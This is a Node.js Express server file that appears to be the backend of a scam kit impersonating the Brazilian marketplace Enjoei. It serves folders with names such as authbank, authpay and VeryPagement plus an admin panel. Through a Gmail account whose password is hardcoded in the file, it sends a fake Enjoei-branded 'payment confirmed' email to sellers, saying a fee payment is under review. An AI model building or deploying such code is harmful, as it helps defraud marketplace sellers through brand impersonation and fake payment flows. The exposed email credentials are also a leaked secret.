const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Serve static files from various folders
app.use('/acesso', express.static(path.join(__dirname, 'acesso')));
app.use('/api', express.static(path.join(__dirname, 'api')));
app.use('/authbank', express.static(path.join(__dirname, 'authbank')));
app.use('/authpay', express.static(path.join(__dirname, 'authpay')));
app.use('/confirm', express.static(path.join(__dirname, 'confirm')));
app.use('/inicial', express.static(path.join(__dirname, 'inicial')));
app.use('/pay', express.static(path.join(__dirname, 'pay')));
app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
app.use('/very', express.static(path.join(__dirname, 'very')));
app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement')));

// Serve static files from 'adm' folder explicitly under /adm
app.use('/adm', express.static(path.join(__dirname, 'adm')));

// Serve inicial folder as the root static folder
app.use(express.static(path.join(__dirname, 'inicial')));

// Specific routes for admin and login
app.get('/admin', (req, res) => {
  const filePath = path.join(__dirname, 'adm', 'admin.html');
  res.sendFile(filePath, (err) => {
    if (err) {
      console.error('Error serving admin.html:', err);
      res.status(404).send('admin.html not found in adm folder');
    }
  });
});

app.get('/login', (req, res) => {
  const filePath = path.join(__dirname, 'adm', 'login.html');
  res.sendFile(filePath, (err) => {
    if (err) {
      console.error('Error serving login.html:', err);
      res.status(404).send('login.html not found in adm folder');
    }
  });
});

// Root route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'inicial', 'index.html'));
});

// Email transporter setup
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'vendasenjoei427@gmail.com',
    pass: 'lrvd jewr hmae ceqi'
  }
});

// Route for sending email
app.post('/enviar-email', (req, res) => {
  const { email } = req.body;

  const mailOptions = {
    from: 'Enjoei <vendasenjoei427@gmail.com>',
    to: email,
    subject: 'Pagamento confirmado! 💰',
    html: `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; line-height: 1.6; color: #333; background-color: #f9f9f9; border-radius: 10px;">
        <div style="text-align: center; padding: 20px; background-color: #800080; border-radius: 10px 10px 0 0;">
            <h1 style="color: #fff; margin: 0; font-size: 28px;">Parabéns pela sua venda! 🎉</h1>
        </div>
        <div style="padding: 20px; background-color: #fff; border-radius: 0 0 10px 10px;">
            <p style="font-size: 16px; margin: 0 0 15px;">Olá,</p>
            <p style="font-size: 16px; margin: 0 0 15px;">Temos uma ótima notícia! Todas as etapas para o recebimento do valor da sua venda foram concluídas com sucesso. 💰</p>
            <p style="font-size: 16px; margin: 0 0 15px;">No momento, estamos finalizando a análise dos detalhes do pagamento da taxa. <strong>Fique de olho!</strong> Em breve, você receberá uma confirmação por <strong>e-mail, SMS ou ligação</strong> avisando que o valor já está na sua conta.</p>
            <p style="font-size: 16px; margin: 0 0 15px;">Enquanto isso, prepare-se para ser redirecionado para uma rápida pesquisa de satisfação. Sua opinião é muito importante para nós! 😊</p>
            <div style="text-align: center; margin: 20px 0;">
                <a href="#" style="display: inline-block; padding: 10px 20px; background-color: #800080; color: #fff; text-decoration: none; border-radius: 5px; font-size: 16px;">Acompanhe seu pagamento</a>
            </div>
            <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;" />
            <p style="font-size: 12px; color: #888; text-align: center;">Este é um e-mail automático, por favor, não responda diretamente. Se precisar de ajuda, entre em contato com nossa equipe em <a href="mailto:suporte@enjoei.com" style="color: #800080;">suporte@enjoei.com</a>.</p>
            <p style="font-size: 12px; color: #888; text-align: center;">Enjoei - Grito da moda! 💜</p>
        </div>
      </div>
    `
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      res.status(500).send('Error sending email');
    } else {
      console.log('Email sent:', info.response);
      res.send('Email sent successfully!');
    }
  });
});

// Catch-all for 404 errors
app.use((req, res) => {
  res.status(404).send('404: Page not found');
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});